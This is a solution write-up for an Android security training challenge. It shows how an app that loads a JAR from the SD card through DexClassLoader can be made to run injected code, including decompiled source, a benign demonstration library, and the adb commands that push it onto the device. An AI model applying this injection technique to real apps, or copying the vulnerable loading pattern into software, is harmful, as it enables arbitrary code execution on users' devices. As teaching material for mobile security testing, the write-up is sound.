# OMTG-Android - 19. Code Injection - Solution

> MSTG-CODE-5: "All third party components used by the mobile app, such as libraries and frameworks, are identified, and checked for known vulnerabilities."

**Summary of the challenge:** The application is injecting Java code from a `jar` file which is in DEX format and located on the SD card using the `dalvik.system.DexClassLoader` class. The `DexClassLoader` loads classes from `jar` or `apk` files containing a classes.dex entry. As a result, it can be used to execute arbitrary, malicious code not installed with the mobile application.

Due to the source of the application is not obfuscated, the APK file can be decompiled by the use of [JADX-GUI](https://github.com/skylot/jadx) tool. The JAR file `libcodeinjection.jar` is dynamically loaded from the SD card's root directory `/sdcard` then the `CodeInjection()` and `returnString()` functions of the `CodeInjection` class are executed.

Source of the code injection class:
```java
public class OMTG_CODING_004_Code_Injection extends AppCompatActivity {
  [...]
  try {
    Class<Object> classToLoad = new DexClassLoader(Environment.getExternalStorageDirectory() + "/libcodeinjection.jar", getDir("dex", 0).getAbsolutePath(), null, getClass().getClassLoader()).loadClass("com.example.CodeInjection");
    String str = "Test";
    Log.e(str, (String) classToLoad.getMethod("returnString", new Class[0]).invoke(classToLoad.newInstance(), new Object[0]));
  }
  catch (Exception e) {
    e.printStackTrace();
  }
}
```

Source of the `libcodeinjection.jar` file, which was created in Android Studio by selecting File => New => New Module => Java Library:
```java
public class CodeInjection {
  
  public CodeInjection() {
    System.out.println("Code Injection Library Constructor called. Class name: " + CodeInjection.class.getName());
  }
  
  public String returnString() {
    return "The class "+ CodeInjection.class.getName() + " and it's method returnString was just called";
  }
}
```

The created JAR file can be found under the `Code_Injection\libcodeinjection\build\libs\libcodeinjection.jar` location and needs to be converted to DEX format to be compatible with the `DexClassLoader` method handler on Android platform. The following commands need to be executed to convert and copy the external library to the SD card:
```cmd
C:\Code_Injection\libcodeinjection\build\libs>c:\Android\SDK\build-tools\28.0.3\dx.bat --dex --output=libcodeinjection.dex libcodeinjection.jar
C:\Code_Injection\libcodeinjection\build\libs>ren libcodeinjection.dex classes.dex
C:\Code_Injection\libcodeinjection\build\libs>"c:\Program Files\Java\jdk1.8.0_201\bin\jar.exe" cfv libcodeinjection_repacked.jar classes.dex
added manifest
adding: classes.dex(in = 1124) (out= 634)(deflated 43%)

C:\Code_Injection\libcodeinjection\build\libs>adb push libcodeinjection_repacked.jar /sdcard/libcodeinjection.jar
libcodeinjection_repacked.jar: 1 file pushed. 0.2 MB/s (1090 bytes in 0.005s)
C:\Code_Injection\libcodeinjection\build\libs>adb shell
root@android:/ # cd /sdcard
root@android:/sdcard # ls -la
d--------- root     root              2019-10-25 16:39 .android_secure
d---rwxr-x system   sdcard_rw          2019-10-21 14:21 Alarms
d---rwxr-x system   sdcard_rw          2019-10-21 14:21 Android
d---rwxr-x system   sdcard_rw          2019-10-21 14:21 DCIM
d---rwxr-x system   sdcard_rw          2019-10-21 14:21 Download
d---rwxr-x system   sdcard_rw          2019-10-21 14:21 LOST.DIR
d---rwxr-x system   sdcard_rw          2019-10-21 14:21 Movies
d---rwxr-x system   sdcard_rw          2019-10-21 14:21 Music
d---rwxr-x system   sdcard_rw          2019-10-21 14:21 Notifications
d---rwxr-x system   sdcard_rw          2019-10-21 14:21 Pictures
d---rwxr-x system   sdcard_rw          2019-10-21 14:21 Podcasts
d---rwxr-x system   sdcard_rw          2019-10-21 14:21 Ringtones
----rwxr-x system   sdcard_rw     1090 2019-10-25 16:12 libcodeinjection.jar
----rwxr-x system   sdcard_rw        5 2019-10-21 14:47 mstg.txt
```

The Code_Injection Android project can be downloaded from my Git repositoy, the original source of this library can be found under the following URL: [https://github.com/sushi2k/libCodeInjection](https://github.com/sushi2k/libCodeInjection)

Run the `adb logcat` command to monitor the log output of the application, then click on the Code Injection button to execute the methods of the `libcodeinjection.jar` external library from the SD card on Android version 5.1.1:

<img src="https://user-images.githubusercontent.com/55597077/67643733-80f86200-f912-11e9-9725-695559bd7c23.png" width="296">

Log output of the application:
```cmd
C:\>adb logcat | findstr CodeInjection
I/System.out(10628): Code Injection Library Constructor called. Class name: com.example.CodeInjection
E/Test    (10628): The class com.example.CodeInjection and it's method returnString was just called
```
